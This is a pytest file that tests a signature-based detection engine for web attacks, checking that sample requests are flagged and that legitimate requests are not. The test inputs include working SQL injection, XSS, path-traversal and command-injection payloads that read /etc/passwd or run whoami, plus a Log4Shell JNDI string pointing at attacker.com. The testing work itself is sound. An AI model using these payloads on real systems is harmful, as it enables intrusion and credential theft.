"""
Tests for signature-based pattern matching.
"""

from __future__ import annotations

import pytest

from src.config import AttackType, Severity
from src.rules.models import RuleMatch
from src.rules.signatures import SignatureEngine


class TestSignatureEngine:
    """Tests for the SignatureEngine class."""
    
    def test_sql_injection_union_detection(self, signature_engine: SignatureEngine):
        """Should detect UNION-based SQL injection."""
        matches = signature_engine.analyze(
            url="/api/users?id=1 UNION SELECT * FROM users--",
            body="",
            headers={},
        )
        
        assert len(matches) > 0
        attack_types = {m.rule.attack_type for m in matches}
        assert AttackType.SQL_INJECTION in attack_types
        
        # Should have CRITICAL severity
        severities = {m.rule.severity for m in matches}
        assert Severity.CRITICAL in severities
    
    def test_sql_injection_tautology_detection(self, signature_engine: SignatureEngine):
        """Should detect tautology-based SQL injection (OR 1=1)."""
        matches = signature_engine.analyze(
            url="/api/login",
            body='{"user": "admin", "pass": "\' OR 1=1 --"}',
            headers={},
        )
        
        assert len(matches) > 0
        sqli_matches = [m for m in matches if m.rule.attack_type == AttackType.SQL_INJECTION]
        assert len(sqli_matches) > 0
    
    def test_xss_script_tag_detection(self, signature_engine: SignatureEngine):
        """Should detect script tag injection."""
        matches = signature_engine.analyze(
            url="/api/comments",
            body='{"text": "<script>alert(1)</script>"}',
            headers={},
        )
        
        assert len(matches) > 0
        xss_matches = [m for m in matches if m.rule.attack_type == AttackType.XSS]
        assert len(xss_matches) > 0
    
    def test_xss_event_handler_detection(self, signature_engine: SignatureEngine):
        """Should detect event handler injection."""
        matches = signature_engine.analyze(
            url="/api/profile",
            body='{"bio": "<img onerror=\'alert(1)\' src=x>"}',
            headers={},
        )
        
        assert len(matches) > 0
        xss_matches = [m for m in matches if m.rule.attack_type == AttackType.XSS]
        assert len(xss_matches) > 0
    
    def test_xss_javascript_protocol(self, signature_engine: SignatureEngine):
        """Should detect javascript: protocol."""
        matches = signature_engine.analyze(
            url="/api/redirect",
            body='{"url": "javascript:alert(document.cookie)"}',
            headers={},
        )
        
        assert len(matches) > 0
        xss_matches = [m for m in matches if m.rule.attack_type == AttackType.XSS]
        assert len(xss_matches) > 0
    
    def test_path_traversal_basic(self, signature_engine: SignatureEngine):
        """Should detect basic path traversal."""
        matches = signature_engine.analyze(
            url="/api/files?path=../../../etc/passwd",
            body="",
            headers={},
        )
        
        assert len(matches) > 0
        pt_matches = [m for m in matches if m.rule.attack_type == AttackType.PATH_TRAVERSAL]
        assert len(pt_matches) > 0
    
    def test_path_traversal_encoded(self, signature_engine: SignatureEngine):
        """Should detect URL-encoded path traversal."""
        matches = signature_engine.analyze(
            url="/api/files?path=%2e%2e%2f%2e%2e%2fetc/passwd",
            body="",
            headers={},
        )
        
        assert len(matches) > 0
        pt_matches = [m for m in matches if m.rule.attack_type == AttackType.PATH_TRAVERSAL]
        assert len(pt_matches) > 0
    
    def test_path_traversal_sensitive_file(self, signature_engine: SignatureEngine):
        """Should detect attempts to access /etc/passwd."""
        matches = signature_engine.analyze(
            url="/api/files/read?file=/etc/passwd",
            body="",
            headers={},
        )
        
        assert len(matches) > 0
        # This should be CRITICAL
        critical_matches = [m for m in matches if m.rule.severity == Severity.CRITICAL]
        assert len(critical_matches) > 0
    
    def test_command_injection_semicolon(self, signature_engine: SignatureEngine):
        """Should detect command injection via semicolon."""
        matches = signature_engine.analyze(
            url="/api/ping",
            body='{"host": "127.0.0.1; cat /etc/passwd"}',
            headers={},
        )
        
        assert len(matches) > 0
        cmdi_matches = [m for m in matches if m.rule.attack_type == AttackType.COMMAND_INJECTION]
        assert len(cmdi_matches) > 0
    
    def test_command_injection_pipe(self, signature_engine: SignatureEngine):
        """Should detect command injection via pipe."""
        matches = signature_engine.analyze(
            url="/api/ping",
            body='{"host": "127.0.0.1 | whoami"}',
            headers={},
        )
        
        assert len(matches) > 0
        cmdi_matches = [m for m in matches if m.rule.attack_type == AttackType.COMMAND_INJECTION]
        assert len(cmdi_matches) > 0
    
    def test_command_substitution(self, signature_engine: SignatureEngine):
        """Should detect command substitution."""
        matches = signature_engine.analyze(
            url="/api/lookup",
            body='{"domain": "$(whoami)"}',
            headers={},
        )
        
        assert len(matches) > 0
        cmdi_matches = [m for m in matches if m.rule.attack_type == AttackType.COMMAND_INJECTION]
        assert len(cmdi_matches) > 0
    
    def test_log4j_detection(self, signature_engine: SignatureEngine):
        """Should detect Log4Shell exploitation attempts."""
        matches = signature_engine.analyze(
            url="/api/header",
            body="",
            headers={"X-Forwarded-For": "${jndi:ldap://attacker.com/exploit}"},
        )
        
        assert len(matches) > 0
        proto_matches = [m for m in matches if m.rule.attack_type == AttackType.PROTOCOL_ATTACK]
        assert len(proto_matches) > 0
    
    def test_ssrf_detection(self, signature_engine: SignatureEngine):
        """Should detect SSRF patterns."""
        matches = signature_engine.analyze(
            url="/api/fetch",
            body='{"url": "http://127.0.0.1:8080/admin"}',
            headers={},
        )
        
        assert len(matches) > 0
        proto_matches = [m for m in matches if m.rule.attack_type == AttackType.PROTOCOL_ATTACK]
        assert len(proto_matches) > 0
    
    def test_no_false_positive_legit_request(self, signature_engine: SignatureEngine):
        """Should not flag legitimate requests."""
        matches = signature_engine.analyze(
            url="/api/v1/users?page=1&limit=10",
            body='{"name": "John Doe", "email": "john@example.com"}',
            headers={"content-type": "application/json", "accept": "application/json"},
        )
        
        assert len(matches) == 0
    
    def test_multiple_matches_per_request(self, signature_engine: SignatureEngine):
        """Should detect multiple attack patterns in a single request."""
        matches = signature_engine.analyze(
            url="/api/users",
            body='{"id": "1 UNION SELECT * FROM users; <script>alert(1)</script>"}',
            headers={},
        )
        
        assert len(matches) >= 2
        attack_types = {m.rule.attack_type for m in matches}
        assert AttackType.SQL_INJECTION in attack_types
        assert AttackType.XSS in attack_types
    
    def test_header_exclusion(self, signature_engine: SignatureEngine):
        """Should exclude specified headers from inspection."""
        matches = signature_engine.analyze(
            url="/api/test",
            body="",
            headers={
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",  # Should be excluded
                "x-custom": "<script>alert(1)</script>",  # Should be checked
            },
            excluded_headers=["user-agent", "accept", "content-type"],
        )
        
        # Should only match the custom header, not user-agent
        xss_matches = [m for m in matches if m.rule.attack_type == AttackType.XSS]
        assert len(xss_matches) == 1
        assert xss_matches[0].matched_field == "headers"
    
    def test_empty_inputs(self, signature_engine: SignatureEngine):
        """Should handle empty inputs gracefully."""
        matches = signature_engine.analyze(
            url="",
            body="",
            headers={},
        )
        
        assert len(matches) == 0
    
    def test_add_custom_rule(self, signature_engine: SignatureEngine):
        """Should allow adding custom rules."""
        import re
        from src.rules.models import SignatureRule
        
        custom_rule = SignatureRule(
            id="CUSTOM-001",
            name="Test Pattern",
            pattern=re.compile(r"test_malicious_pattern", re.IGNORECASE),
            severity=Severity.MEDIUM,
            description="Test rule",
            attack_type=AttackType.UNKNOWN,
        )
        
        signature_engine.add_rule(custom_rule)
        
        matches = signature_engine.analyze(
            url="/api/test",
            body="test_malicious_pattern",
            headers={},
        )
        
        assert len(matches) == 1
        assert matches[0].rule.id == "CUSTOM-001"
    
    def test_remove_rule(self, signature_engine: SignatureEngine):
        """Should allow removing rules."""
        initial_count = len(signature_engine.rules)
        signature_engine.remove_rule("SQLI-001")
        assert len(signature_engine.rules) == initial_count - 1
        assert signature_engine.remove_rule("NONEXISTENT") is False
